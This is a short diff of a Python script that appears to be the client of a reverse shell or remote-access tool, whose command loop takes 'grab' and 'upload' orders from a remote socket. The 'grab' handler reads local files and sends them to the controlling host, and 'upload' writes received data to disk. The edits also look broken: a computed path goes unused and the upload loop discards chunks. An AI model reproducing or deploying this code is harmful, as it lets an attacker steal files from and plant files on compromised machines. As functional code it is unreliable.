@@ -41,28 +41,30 @@ def connect():
 
 
 def transferupload(s,command):
-    upload,fname=command.split('*')
-    path=os.getcwd()+"/"
-    path += fname
-    f=open(path,'wb+')
-    bits=s.recv(1024)
-    while True:
-        f.write(bits)
-
-        if bits.endswith('DONE'):
-            f.close()
-            break
-        bits=s.recv(1024)
+	upload,path=command.split('*')
+	fpath=os.getcwd()+"/"
+	fpath += os.path.basename(path)
+	f=open(path,'wb+')
+	bits=s.recv(1024)
+	msg=bits.decode()
+	while True:
+		f.write(bits)
+		bits=s.recv(1024)
+		msg=bits.decode()
+		if 'DONE' in msg:
+			f.close()
+			break
+		bits=s.recv(1024)
 
  
 def transfergrab(s,path):
 	if os.path.exists(path):
 		if os.path.isfile(path):
-			f=open(path,'rb')
+			f=open(path,'r')
 			f.seek(0)
 			packet=f.read(1024)
 			while packet:
-				s.send(packet)
+				s.send(packet.encode())
 				packet=f.read(1024)
 			s.send(("DONE").encode())
 			f.close()
@@ -119,11 +121,9 @@ def connection():
 
 		if 'grab' in command:
 			grab,path=command.split('*')
-			try:
-				transfergrab(s,path)
-			except:
-				s.send("ERROR".encode())
-			
+			transfergrab(s,path)
+
+
 		elif 'upload' in command:
 			transferupload(s,command)
 
